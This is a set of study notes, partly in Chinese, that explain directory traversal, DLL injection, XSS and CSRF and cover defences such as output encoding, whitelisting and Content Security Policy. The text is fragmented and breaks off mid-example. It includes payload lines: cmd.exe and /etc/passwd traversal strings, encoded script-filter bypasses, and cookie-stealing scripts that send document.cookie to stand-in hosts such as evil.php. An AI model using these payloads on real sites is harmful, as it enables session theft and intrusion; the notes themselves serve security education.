  - If an attacker can get out of this directory and get to C:\windows, the possibility for inflicting harm is increased exponentially.
command injection attack: simplest ways to perform directory traversal.
  - Example:
  - exploiting weak IIS implementation by calling up a web page along with parameter cmd.exe?/c+dir+c:\, call the command shell and execute a directory listing of the root drive (C:\).
  - With Unicode support, entries such as %c%1c and %c0%af can be translated into / and \, respectively.
  - The ability to perform command injection is rare these days.
  - Most vulnerability scanners will check for weaknesses with directory traversal/command injection and inform you of their presence.   - To secure, run such a scanner and keep the web server software patched.
   - Example:
 ⁃
  - a command was entered
  - the attacker was attempting to gain access to the password file within the /etc directory.
  - If the attacker tried to inject code, they would not use commands, but rather PHP, ASP, or another language.
Example:
Unix systems, the passwd file includes user logon information, and it is stored in
the /etc directory with a full directory path of /etc/passwd
Attackers use commands: ../../etc/passwd or /etc/passwd to read the file.
Similarly, they could use a remove directory command (such as rm -rf) to delete a directory, including all files and subdirectories.
prevent these types of attacks Input validation. DLL injection
Windows programs frequently make use of dynamic linked libraries (DLLs) that are
loaded into the memory space of the application.
Applications commonly use a Dynamic Link Library (DLL) or multiple DLLs. DLL: a compiled set of code that an application can use without recreating the code. Example:
most programming languages include math-based DLLs.
Instead of writing the code to discover the square root of a number, a developer can include the appropriate DLL and access the square root function within it.
DLL injection: the malware tries to inject code into the memory process space of a library.
injects a DLL into a system’s memory and causes it to run.
  - to compromise the program calling the DLL.
  - a rather sophisticated attack. Example:
attacker creates a DLL malware.dll, includes several malicious functions. DLL injection attack
the attacker attaches to a running process,
allocates memory within the running process,
connects the malicious DLL within theallocated memory, and then executes functions within the DLL. ▪


##  XSS
CSRF
defined by the Open Web Application Security Projection (OWASP) as “an attack which forces an end user to execute unwanted actions
on a web application in which he/she is currently authenticated.” According to the Web Application Security Consortium, CSRF “is an
attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim.”
XSS更偏向于代码实现(即写一段拥有跨站请求功能的JavaScript 脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中 了XSS攻击了)，
 defined by the Open Web Application Security Projection (OWASP)
as “a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites.”
According to the Web Application Security Consortium, XSS “is an
attack technique that involves echoing attacker-supplied code into a user’s browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product.”
   - ▪


## CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是 CSRF了。
条条大路(XSS路，命令行路)通罗⻢(CSRF⻢， XSRF⻢)。
prevent Cross-site Scripting (XSS) flaws in software applications Validate and escape all information sent to a server
Unlike SQL Injection, which affects any application type, CSRF and XSS affect only web-based applications and technologies.
internal threats can be even more dangerous, have access to more
resources than external attackers, which makes the combination of XSS and CSRF a lethal combination.
In an attack scenario, an external attacker combines a CSRF attack
with an XSS attack, allowing infiltration, escalation of privilege, and other gains to internal resources.
One common form of this combination is called phishing, which
utilizes email to entice a user to click a link to a malicious site that contains a CSRF attack signature along with malicious XSS in order to capture and send information or download malicious content without the unsuspecting user’s knowledge.
Cross-Site Scripting XSS/CSS 跨站脚本
      Part One: Overview
- web application vulnerability
  - 是代码注入的一种。
  - 将代码注入到网⻚上，其他用户在观看网⻚时就会受到影响。
- the basics of this attack revolve around website design, dynamic content, and invalidated input data.
Cross-Site Scripting (XSS) attacks occur when:
1. Data enters a Web application through an untrusted source (web
request.etc)
2. malicious scripts are injected into trusted websites.
  - attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
  - take advantage of scripting and have it perform something other than the intended response.
  - sends a specific request to a website, embed malicious code into web site’s code.
  - The malicious content often is a segment of JavaScript, HTML, Flash, or other type of code that the browser may execute
  - use a client-side scripting language
  - trick a user who visits the site into having code execute 1,845

▪
3.
locally.
 data included dynamic content that is sent to a web user without
for malicious content.
  - Flaws that allow these attacks to succeed are quite
widespread
  - occur anywhere a web application uses input from a user
within generates the output of it without validating or encoding
it.
  - causes the website to send malicious Web / email code to user.
being validated
4. The code executes when the user visits the site.
  - when a web form pops up, the user inputs something, and
then some script dynamically changes the appearance or
behavior of the website based on what has been entered.
  - 这类攻击通常包含了HTML以及用户端脚本语言
  - 通过客户端脚本语言(如 JavaScript), 在论坛发帖中发布一段恶 意的JavaScript代码脚本注入，如果这个代码内容有请求外部服
务器，那么就叫做XSS
By exploiting vulnerabilities of web server, attacker uses the website
as an intermediary for transferring malicious code to another victim.
  - victim is usually not aware of being exploited because as
assumes the data received are from a valid Web server.
XSS Attack Consequences
The consequence of an XSS attack is the same regardless of whether it is stored or reflected (or DOM Based). The difference is in how the payload arrives at the server.
•
⁃
  - disclosure of end user files,
- installation of Trojan horse programs,
    has access to user's sensitive information
 disclosure of the user’s session cookie
  - copy cookies from the victim’s computer and relay them to the attacker.
  - allowing an attacker to hijack the user’s session and take over the account. ▪


## - redirect the user to some other page or site, controlled by the attacker,
  - send HTTP requests with arbitrary content to arbitrary destinations
  - by using XMLHttpRequest and other mechanisms.
- modify presentation of content.
  - make arbitrary modifications to the HTML of the current page
  - by using DOM manipulation methods.
- performing malicious operations on the user’s machine under the
guise of the vulnerable site.
- the malicious script can access any cookies, session tokens, or
other sensitive information retained by the browser and used with that site.
  - An XSS vulnerability allowing an attacker to modify a press release or news item could affect a company’s stock price or lessen consumer confidence.
  - An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose.
- Keylogging
  - The attacker can register a keyboard event listener
using addEventListener
  - send all of the user's keystrokes to his own server,
  - potentially recording sensitive information
  - such as passwords and credit card numbers.
- Phishing
  - insert a fake login form into the page using DOM manipulation,
  - set the form's action attribute to target his own server,
  - and then trick the user into submitting sensitive information.
finds website section where users can interact with each other.
  - like product review section.
  - in the input text field, the attacker types in some script (like
JavaScript), next time a user visits that section of the website, the script is executed.
Example:
       - when the security of a web app relies on JavaScript for input validation, The integrity of the data is at risk.
   - UserA gets a message about his XYZ account, but the link in the message is not really to the XYZ site (phishing ploy).
  - When he visits the site, a script routine begins to run on his machine with his permissions, can do things as running malevolent 有恶意的 routines to send, delete, or alter data.
  - A web application is configured to target browsers
Part Two: XSS Attacks
Different XSS Attacks
- Stored vs. Reflected XSS
- Server vs. Client XSS
  - DOM Based XSS is a subset of Client XSS.
Stored XSS Attacks
- Persistent / Type-I XSS
- the injected script is permanently stored on the target servers
  - such as in a database, message forum, visitor log, comment field, etc.
- The victim retrieves the malicious script from the server when it requests the stored information.
  - `<Script>alert(‘XSS!’)</script>`
  - `<H1>Big Title</H1>`
- Goal:
  - the user targets a specific individual, send the malicious URL to the victim (using e-mail or instant messaging, for example) and trick him into visiting it.
  - the user targets a large group of people, the attacker can publish a link to the malicious URL (on his own website or on a social network, for example) and wait for visitors to click it.
    •
Reflected XSS Attacks
- Non-Persistent / Type-II XSS
- The user input is been reflected as part of the page.
- the injected script is reflected off the web server
  - such as in an error message, search result
  - any response that includes some input sent to the server as
part of the request.
- Reflected attacks are delivered to victims via another route
  - such as in e-mail message, or on some other website.
  - When user click on a malicious link, submitting a specially
crafted form, or even just browsing to a malicious site
  - the injected code travels to the vulnerable web site, which
reflects the attack back to the user’s browser.
  - The browser then executes the code because it came from a
“trusted” server.
  - `<Script>alert(document.cookie)</script>`
  •
 •
DOM Based XSS
- Document object model.
- Type-0 XSS, identified by Amit Klein in 2005.
- the attack payload is executed as a result of modifying the DOM
 “environment” in the victim’s browser used by the original client side script
  - The
.
  - It is injected and stays in the browser the entire time
  - the client side code runs in an “unexpected” manner.
  - the page itself (the HTTP response) does not change
  - but the client side code contained in the page executes
differently due to the malicious modifications that have
occurred in the DOM environment.
- This is in contrast to other XSS attacks (stored or reflected)
  - wherein the attack payload is placed in the response page (due to a server side flaw).
  - In persistent and reflected XSS attacks
  - the server inserts the malicious script into the page, then
sent in a response to the victim.
  - When the victim's browser receives the response, it
assumes the malicious script to be part of the page's legitimate content and automatically executes it during page load as with any other script.
  - In DOM-based XSS attack
  - no malicious script inserted as part of the page;
  - the only script that is automatically executed during page
load is a legitimate part of the page.
  - but this legitimate script directly makes use of user input
in order to add HTML to the page.
  - Because the malicious string is inserted into the page
using innerHTML, it is parsed as HTML, causing the
malicious script to be executed.
  - The difference is subtle but important:
   - Example
malicious code does not come from the web server or
database
⁃
server. ⁃
, as part of the HTML sent by the
In traditional XSS, the malicious JavaScript is executed
when the page is loaded
 In DOM-based XSS, the malicious JavaScript is executed
, as a result of the page's legitimate JavaScript treating user input in an
unsafe way.
at some point after the page has loaded - Suppose the following code is used to create a form to let the user choose their preferred language.
  - A default language is also provided in the query string, as the parameter “default”.
 Select your language: <select><script>
document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.index Of("default=")+8)+"</OPTION>");
document.write("<OPTION value=2>English</OPTION>"); </script></select>
The page is invoked with a URL such as:
http://www.some.site/page.html?default=French
A DOM Based XSS attack against this page can be accomplished by
sending the following URL to a victim:
When the victim clicks on this link, the browser sends a request to www.some.site. /page.html?default=<script>alert(document.cookie)</script>
The server responds with the page containing the above Javascript code. The browser creates a DOM object for the page, in which the document.location object contains the string:
The original Javascript code in the page does not expect the default parameter to contain HTML markup, and as such it simply echoes it into the page (DOM) at runtime. The browser then renders the resulting page and executes the attacker’s script:
alert(document.cookie)
Note that the HTTP response sent from the server does not contain the
  http://www.some.site/page.html? default=<script>alert(document.cookie)</script>
  http://www.some.site/page.html? default=<script>alert(document.cookie)</script>
 attacker’s payload. This payload manifests itself at the client-side script at runtime, when a flawed script accesses the DOM variable document.location and assumes it is not malicious.
  1. The attacker crafts a URL containing a malicious string and sends it
to the victim.
2. The victim is tricked by the attacker into requesting the URL from the
website.
3. The website receives the request, without the malicious string in the
response.
4. The victim's browser executes the legitimate script inside the
response, causing the malicious script to be inserted into the page.
5. The victim's browser executes the malicious script inserted into the
page, sending the victim's cookies to the attacker's server.
    Why DOM-based XSS matters
In the previous example, JavaScript was not necessary; the server could have generated all the HTML by itself. If the server-side code were free of vulnerabilities, the website would then be safe from XSS.
However, as web applications become more advanced, an increasing amount of HTML is generated by JavaScript on the client-side rather than by the server. Any time content needs to be changed without refreshing the entire page, the update must be performed using JavaScript. Most notably, this is the case when a page is updated after an AJAX request.
This means that XSS vulnerabilities can be present not only in your website's server-side code, but also in your website's client-side JavaScript code. Consequently, even with completely secure server-side code, the client-side code might still unsafely include user input in a DOM update after the page has loaded. If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.
DOM-based XSS invisible to the server
- special case of DOM-based XSS
- the malicious string is never sent to the website's server to begin with:
- when the malicious string is contained in a URL's fragment identifier (anything after the # character).
- Browsers do not send this part of the URL to servers, so the website has no way of accessing it using server-side code.
- The client-side code, however, has access to it and can thus cause XSS vulnerabilities by handling it unsafely.
- This situation is not limited to fragment identifiers. Other user input that is invisible to the server includes new HTML5 features like LocalStorage and IndexedDB.
Alternate XSS Syntax
XSS Using Script in Attributes
- conducted with
- Other tags:
- Onmouseover:
tags.
 <script>...</script>
 <body onload=alert('test1')>
 <b onmouseover=alert('Wufff!')>click me!</b> ▪


##  - Onerror:
XSS Using Script Via Encoded URI Schemes
- to hide against web application filters, encode string characters,
- e.g.: a=&\#X41 (UTF-8)
- use it in IMG tags: <IMG SRC=j&#X41vascript:alert('test2')>
XSS Using Code Encoding
- encode script in base64 and place it in META tag.
- This way get rid of   totally.
what XSS is and what you can do with it Recognize URL indicator of an XSS attempt:
http://IPADDRESS/′′;!- -′′<XSS>=&{()}.
XSS attempts pop up all over the place in in all sorts of formats.
One of the classic attacks: getting access to “document.cookie” and
sending it to a remote host.
  - Example
  - used the following in a form field entry instead of providing
your name:
  - &lt;script;window.open#40;&quot;http:/ /abc. com/ getcookie.acookie=&quot;+document.cookie#41;&lt;/script&gt;
  - Should the app be vulnerable to XSS, the Java script entered (converted to HTML entities where appropriate—how fun!) will be run and you can obtain cookies from users accessing the page later
XSS can be used to perform badness on a target server. bring a target down with a good old DoS attack?
send an XSS attack via e-mail?
having the injected script remain permanently on the target server (like in a database, message forum, visitor log, or comment field)?
(stored XSS, a.k.a. persistent or Type-I XSS). 1,855
<img src="http://url.to.file.which/not.exist"
onerror=alert(document.cookie);>
   alert()
- <META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html;
 base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

▪
 be used to upload malicious code to users connected to the server, to send pop-up messages to users, and to steal virtually anything.
That PHP session ID that identifies the user to the website stolen
through an XSS? Well, the attacker has it now and can masquerade as the user all day, plugged into a session.
XSS attacks can vary by application and by browser and can range from nuisance to severe impact, depending on what the attacker chooses to do.
RSnake and http://hackers.org/xss.html are authoritative sources for XSS attacks.
How to Determine Vulnerable
- perform a security review of the code
- search for all places where input from an HTTP request could
possibly make its way into the HTML output.
- Note that a variety of different HTML tags can be used to transmit a
malicious JavaScript.
- Nessus, Nikto, and some other available tools can help scan a
website for these flaws, but can only scratch the surface.
- If one part of a website is vulnerable, there is a high likelihood that
there are other problems as well.
Part Three: Preventing XSS
Countermeasures
1. Don’t trust input
2. Input validation
  - constrain 约束 and sanitize the input data stream.
  - filter input, like SQL injection.
  - Validation, filters the user input so that the browser interprets
it as code without malicious commands.
  - All input data should be checked for data type, format, range, and irregular expressions.
  - Whiltelist of allowed values
     - The primary protection:
  - the web application with sophisticated input validation
techniques.
  - avoid methods that allow the web page to display untrusted
data.
  - Input originating from server controls should be subject to ASP.NET validator controls such as RangeValidator.
3. use a security encoding library.
  - OWASP strongly recommends ⁃
.
  - encoding library will sanitize HTML code and prevent XSS attacks.
  - encode output that contains user input data or data from databases.
  - HtmlEncode: encode characters with special designations in HTML
  - obscuring executable code that would otherwise be run.
⁃`
`
  - Replace "<" and ">" characters with "& lt;" and "& gt;" using
server scripts
4. Use buildin protection on frame or library   - VS: `ValidationRequest=“false”`
5. Use security headers
  - CSP, contect security policy
  - X-XSS-protection
6. Set flags on cookies
  - HttpOnly, Secure
7. educate users about the dangers of clicking links.
  - Some XSS attacks send emails with malicious links within
them.
8. turn off HTTP TRACE support on all web servers.
  - An attacker can steal cookie data via Javascript even when document.cookie is disabled or not supported by the client.
  - This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the user’s cookie
  escapes user input so the browser interprets it as data, not as
code
 Label1.Text = “This is output:” +
Server.HtmlEncode(TextBox1.Text);
   information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack.
  - mitigated by removing support for HTTP TRACE on all web servers.
- Context
  - Secure input handling needs to be performed differently depending on where in a page the user input is inserted.
- Inbound/outbound
  - Secure input handling can be performed either when your website receives the input (inbound) or right before your website inserts the input into a page (outbound).
- Client/server
  - Secure input handling can be performed either on the client- side or on the server-side, both of which are needed under different circumstances.
Input handling contexts
contexts in a web page where user input might be inserted.
For each of these, specific rules must be followed so that the user input cannot break out of its context and be interpreted as malicious code.
  Context
   Example code
    HTML element content
  <div>userInput</div>
     HTML attribute value
    <input value="userInput">
   URL query value
   http://example.com/?parameter=userInput
   CSS value
   color: userInput
   JavaScript value
    var name = "userInput";
 - XSS vulnerability arise if user input were inserted, before being encoded or validated.
- An attacker would then be able to inject malicious code by simply inserting the closing delimiter for that context and following it with the malicious code.
For example, if at some point a website inserts user input directly into an HTML attribute, an attacker would be able to inject a malicious script by beginning his input with a quotation mark, as shown below:
Application code <input value="userInput">
Malicious string "><script>...</script><input value="
Resulting code <input value=""><script>...</script><input value="">
Inbound/outbound input handling
Relying on inbound input handling to prevent XSS is thus a very brittle solution that will be prone to errors. (The deprecated "magic quotes" feature of PHP is an example of such a solution.)
Instead, outbound input handling should be your primary line of defense against XSS, because it can take into account the specific context that user input will be inserted into.
Where to perform secure input handling
In most modern web applications, user input is handled by both server- side code and client-side code.
to protect against all types of XSS, secure input handling must be performed in both the server-side code and the client-side code.
- In order to protect against traditional XSS, secure input handling must be performed in server-side code. This is done using any language supported by the server.
- In order to protect against DOM-based XSS where the server never receives the malicious string (such as the fragment identifier attack described earlier), secure input handling must be performed in client- side code. This is done using JavaScript.
Encoding
- use a security encoding library.
- OWASP strongly recommends
- escapes user input so the browser interprets it as data, not as code.
- encoding library will sanitize HTML code and prevent XSS attacks.
- encode output that contains user input data or data from databases.
       - HtmlEncode: encode characters with special designations in HTML
- obscuring executable code that would otherwise be run. •`
`
- Replace "<" and ">" characters with "& lt;" and "& gt;" using server scripts
 Label1.Text = “This is output:” +
Server.HtmlEncode(TextBox1.Text);
 Encoding on the client-side
encoding user input on the client-side using JavaScript, several built-in methods and properties that automatically encode all data in a context- aware manner:
  Context
   Method/property
     HTML element content
    node.textContent = userInput
     HTML attribute value
   element.setAttribute(attribute, userInput) element[attribute] = userInput
   URL query value
  window.encodeURIComponent(userInput)
   CSS value
    element.style.property = userInput
 JavaScript provides no built-in way of encoding data to be included in JavaScript source code.
Limitations of encoding
when user input is used to provide URLs, such as in the example below:
document.querySelector('a').href = userInput
1. Although assigning a value to the href property of an anchor element
automatically encodes it so that it becomes nothing more than an
attribute value
2. this in itself
.
  - When the link is clicked, whatever JavaScript is embedded
inside the URL will be executed.
3. Encoding is an inadequate solution when you actually want the user
to define part of a page's code.
  - An example is a user profile page where the user can define
custom HTML.
  - If this custom HTML were encoded, the profile page could
consist only of plain text.
4. Encoding should be your first line of defense against XSS, because
its very purpose is to neutralize data so that it cannot be interpreted as code. In some cases, encoding needs to be complemented with validation,
Validation
- filtering user input
- all malicious parts of it are removed, without necessarily removing all
code in it.
- One of the most recognizable types of validation in web
development is allowing some HTML elements (such
as <em> and <strong>) but disallowing others (such as <script>).
- two main characteristics of validation that differ between
implementations:
- Classification strategy
  does not prevent the attacker from inserting a URL
beginning with "javascript:"
   - User input can be classified using either blacklisting or whitelisting.
- Validation outcome
  - User input identified as malicious can either be rejected or
sanitised.
- Classification strategy
- Blacklisting
  - defining a forbidden pattern that should not appear in user input.
  - If a string matches this pattern, it is then marked as invalid.
  - An example would be to allow users to submit custom URLs with any protocol except javascript:.
  - 2 major drawbacks:
  - Complexity
  - Accurately describing the set of all possible malicious strings is usually a very complex task.
  - The example policy described above could not be successfully implemented by simply searching for the substring "   ", because this would miss strings of the form "   " (where the first letter is capitalized) and "   " (where the first letter is encoded as a numeric character reference).
  - Staleness
  - Even if a perfect blacklist were developed, it would fail if a new feature allowing malicious use were added to the browser.
  - For example
  - an HTML validation blacklist developed before the
introduction of the HTML5 onmousewheel attribute, would fail to stop an attacker from using that attribute to perform an XSS attack.
  - This drawback is especially significant in web development, which is made up of many different technologies that are constantly being updated.
  - Because of these drawbacks, blacklisting as a classification strategy is strongly discouraged.
  - Whitelisting is usually a much safer approach, as we will
 javascript
Javascript:
&#106;avascript:
 describe next.
- Whitelisting
  - instead of defining a forbidden pattern, defines an allowed pattern and marks input as invalid if it does not match this pattern.
  - Example
  - allow users to submit custom URLs containing only the
protocols http: and https:, nothing else.
  - This approach would automatically mark a URL as invalid
if it had the protocol javascript:, even "Javascript:" or
"&#106;avascript:".
  - 2 major benefits of whitelisting:
  - Simplicity
  - Accurately describing a set of safe strings is generally much easier than identifying the set of all malicious strings.
  - This is especially true in common situations where user input only needs to include a very limited subset of the functionality available in a browser.
  - For example, the whitelist described above allowing only URLs with the protocols http: or https: is very simple, and perfectly adequate for users in most situations.
  - Longevity
  - generally not become obsolete when a new feature is added to the browser.
  - For example
  - an HTML validation whitelist allowing only
the title attribute on HTML elements
  - remain safe after the introduction of
HTML5 onmousewheel attribute.
- Validation outcome
  - Rejection
  - The input is simply rejected, preventing it from being used elsewhere in the website.
  - Sanitisation
  - All invalid parts of the input are removed,
  - the remaining input is used normally by the website.
  - Of these two, rejection is the simplest approach to implement.
       - to implement sanitisation, you must make sure that the sanitisation routine itself doesn't use a blacklisting approach.
  - For example, the URL "Javascript:...", even when identified as invalid using a whitelist approach, would get past a sanitisation routine that simply removes all instances of "javascript:".
  - For this reason, well-tested libraries and frameworks should be used for sanitisation whenever possible.
Content Security Policy (CSP)
- using only secure input handling is that even a single lapse of security
- recent web standard, Content Security Policy (CSP) can mitigate this risk.
- CSP is used to constrain the browser viewing your page
      - ⁃
⁃
it can only use resources downloaded from trusted sources. A resource is a script, a stylesheet, an image, or some other type of file referred to by the page.
even if an attacker succeeds in injecting malicious content into your website, CSP can prevent it from ever being executed.
- CSP can be used to enforce the following rules:   - No untrusted sources
  - External resources can only be loaded from a set of clearly defined trusted sources.
  - No inline resources
  - Inline JavaScript and CSS will not be evaluated.
  - No eval
  - The JavaScript eval function cannot be used. - CSP in action
  - example,
  - an attacker has succeeded in injecting malicious code into a
page:
  - With a properly defined CSP
   - <html>
Latest comment:
<script src="http://attacker/malicious‐script.js"></script>
  - </html> policy
  - the browser would not load
and
execute malicious‐script.js
  - because http://
attacker/ not be in the set
of trusted sources.
  - Even though the website failed
to securely handle user input in this case
  - the CSP policy prevented the vulnerability from causing any harm.
  - Even if the attacker had injected the script code inline rather than linking to an external file
  - a properly defined CSP policy disallowing inline JavaScript would also have prevented the vulnerability from causing any harm.
- How to enable CSP
  - By default, browsers do not enforce CSP.
  - To enable CSP on your website, pages must be served with an additional HTTP
header: Content‐Security‐Policy.
  - Any page served with this header will have its security policy respected by the browser loading it, provided that the browser supports CSP.
  - the security policy is sent with every HTTP response,
  - it is possible for a server to set its policy on a page-by- page basis.
   - The same policy can be applied to an entire website by providing the same CSP header in every response.
  - The value of
the Content‐Security‐Policy head er is a string defining one or more security policies that will take effect on your website. The syntax of this string will be described next.
  - The example headers in this section use newlines and indentation for clarity; this should not be present in an actual header.
- Syntax of CSP
  - The syntax of a CSP header is as follows:
  - This syntax is made up of two elements:
  - Directives: strings specifying a type of resource, taken from a predefined list.
  - Source expressions: patterns describing one or more servers that resources can be downloaded from.
  - For every directive, the given source expressions define which sources can be used to download resources of the respective type.
  - Directives
  - The directives that can be used in a CSP header are
    - Content‐Security‐Policy:
directive source‐expression, source‐expression, ...; directive ...;
... as follows:
  - connect‐src
  - font‐src
  - frame‐src
  - img‐src
  - media‐src
  - object‐src
  - script‐src
  - style‐src
  - the special directive default‐src
  - can be used to provide a default value for all directives that have not been included in the header.
  - Source expressions
  - The syntax of a source expression is as follows:
  - The host name can start with *., which means that any subdomain of the provided host name will be allowed.
  - Similarly, the port number can be *, which means that all ports will be allowed.
  - Additionally, the protocol and port number can be omitted.
  - a protocol can be given by itself,
possible to require that all resources be loaded using HTTPS.
   - protocol:// host‐name:port‐num ber   - In addition to the syntax above, a source expression can alternatively be one of four keywords with special meaning (quotes included):
  - 'none'
  - Allows no resources.
  - 'self'
  - Allows resources from the host that served the page.
  - 'unsafe‐inline'
  - Allows resources embedded in the page, such as
inline <script> elements, <style> elements,
and javascript: URLs.
  - 'unsafe‐eval'
  - Allows the use of the JavaScript eval function.
  - when CSP is used, inline
resources
and eval are automatically disallowed by default.
⁃
Using 'unsafe‐i
- An example policy
nline' and 'unsa fe‐eval' is the only way to allow them.
   - Content‐Security‐Policy: script‐src 'self'
scripts.example.com; media‐src 'none'; img‐src *;  default‐src 'self' http://
*.example.com
  - In this example policy, the page is subject to the following restrictions:
  - Scripts can be downloaded only from the host serving the page and from scripts.example.com.
  - Audio and video files cannot be downloaded from anywhere.
  - Image files can be downloaded from any host.
  - All other resources can be downloaded only from the
host serving the page and from any subdomain
of example.com
- Status of CSP
- As of June 2013, Content Security Policy is a W3C candidate recommendation.
- It is being implemented by browser vendors, but parts of it are still browser-specific.
- In particular, the HTTP header to use can differ between browsers.
- Before using CSP today, consult the documentation of the browsers that you intend to support.
Ref:
[Stored & Reflected XSS and Testing with OWASP ZAP](https:// www.youtube.com/watch? v=u12HB_WjmQE&ab_channel=DominicBatstone)
[Cross-Site Scripting Explained - Part 2: DOM-Based XSS](https:// www.youtube.com/watch?v=UFlF3F-XOG4&ab_channel=webpwnized) [Excess XSS](https://excess-xss.com/)
Examples
Cross-site scripting attacks may occur anywhere
               - where users are allowed to post unregulated material to a trusted website for the consumption of other valid users.
- The most common example can be found in bulletin-board websites which provide web based mailing list-style functionality.
Example 1
The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.
- The code in this example operates correctly if eid contains only standard alphanumeric text.
- If eid has a value that includes meta-characters or source code
  - then the code will be executed by the web browser as it
displays the HTTP response.
- attacker will create the malicious URL, then use e-mail or social
engineering tricks to lure victims into visiting a link to the URL.
- When victims click the link, they unwittingly reflect the malicious
content through the vulnerable web application back to their own
computers.
- This mechanism of exploiting vulnerable web applications is known
as Reflected XSS.
Example 2
The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee’s name.
 <% String eid = request.getParameter("eid"); %> Employee ID: <%= eid %>
 <%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+
eid );
if (rs != null) {
rs.next();
String name = rs.getString("name");
%>
Employee Name: <%= name %>
- code functions correctly when the values of name are well-behaved,
- this code can appear less dangerous because the value of name is read from a database
  - contents are apparently managed by the application.
  - However, if the value of name originates from user-supplied
data, then the database can be a conduit for malicious content.
  - Malicious user stor malicious input in database
- Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user’s web browser.
- This type of exploit, known as Stored XSS
  - particularly insidious because the indirection caused by the
data store makes it more difficult to identify the threat and
increases the possibility that the attack will affect multiple users. - XSS got its start in this form with websites that offered a “guestbook”
to visitors.
  - Attackers would include JavaScript in their guestbook entries
  - and all subsequent visitors to the guestbook page would
execute the malicious code.
As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:
- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response.
  - Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser.
  - The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.
  - URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site.
  - After the site reflects the attacker’s content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user’s machine to the attacker or perform other nefarious activities.
- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content.   - Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content.
  - From an attacker’s perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users.
  - Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker.
  - If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.
- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.
Attack Examples
Example 1: Cookie Grabber
- If the application doesn’t validate the input data
- the attacker can steal a cookie from an authenticated user.
- All the attacker has to do is to place the following code in any posted
input(ie: message boards, private messages, user profiles):
- The code will pass an escaped content of the cookie (according to
RFC, content must be escaped before sending it via HTTP protocol
with GET method) to the evil.php script in “cakemonster” variable.
- The attacker then checks the results of their evil.php script and use it.
  - a cookie grabber script will usually write the cookie to a file
Error Page Example
- an error page, handling requests for a non existing pages, a classic 404 error page.
- may use the code to inform user about what specific page is missing:
<html>
 <SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie); </SCRIPT>
   ▪


## <body>
<? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?> </body>
</html>
1. try:
  - http://testsite.test/file_which_not_exist 2. In response we get:
  - Not found: /file_which_not_exist 3. force the error page to include our code:
  - http://testsite.test/<script>alert("TEST");</script>
4. The result is:
5. We have successfully injected the code, may use this to steal user’s session cookie.
CSRF Explained
An action can consist of purchasing items, transferring monies, administering users, and managing records.
For each action there is a corresponding GET or POST request that communicates this action from the client browser to the server.
As many of these actions are sensitive in nature, most web
applications require that the user is authenticated and that the communication channel is encrypted, i.e. HTTPS. Table1 is a summary of a CSRF attack.
Method Type Attack Details
      - Not found: / (but with JavaScript code <script>alert("TEST");</
script>)
        ▪


## The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or similar message system.
So how does this attack work? Let’s say you are logged into your banking website, called ABCBank.com. The bank adheres to the principle of two factor authentication (username and password and a subsequent PIN) and the communication between you and the bank is encrypted (via HTTPS).
After the browser recognizes and validates the certificate issued by
the bank you are logged in and viewing your information in a secure session.
a) Banking website requesting credentials (1st factor of authentication);
b) Banking website asking for personal PIN (2ndfactor of authentication);
c) Communication is in a secure session (https);
d) The Lock symbol indicates the certificate information from the banking website is valid and authenticate.
Now that you are authenticated to the banking website and authorized to access your account, the credential information (generally represented by a Session Identifier) is cached on the local machine, usually in the form of an encrypted cookie.
The cookie will act on your behalf when credential information is repeatedly requested as you move through the website, thereby not
Spoofing
       ▪


## requiring you to type your credential information repeatedly for each page you visit.
While this is a convenience to you, this is where the CSRF attack
takes advantage of this convenience, combined with the trusted nature the application gives to the process: in other words, the application fails at the cliché “trust but verify.”
CSRF In Action
real-life CSRF in action.
1) A user logs into his/her bank account;
2) the bank account uses URL parameters to pass a unique identifier for the bank account number and the type of view;
3) the user clicks a link in an email message that he believes is from his friend;
4) the link takes him to a malicious site that exposes the URL parameters of the banking website to perform actions on behalf of the
user without the user’s knowledge.
The following URL is used by the banking site to determine navigation and
action:
https://www.somebank.com/inet/sb_bank/BkAccounts? target=AccountSummary&currentaccountkey=encryptedec117d8fd0eb30ab 690c051f73f4be34&TransferView=TRUE.
The Request information for the above URL is as follows (the real values are removed or replaced with fake values where applicable):
Accept: text/html, application/xhtml+xml, */*
Referer: https://www.somebank.com/inet/sb_bank/BkAccounts? target=AccountSummary&
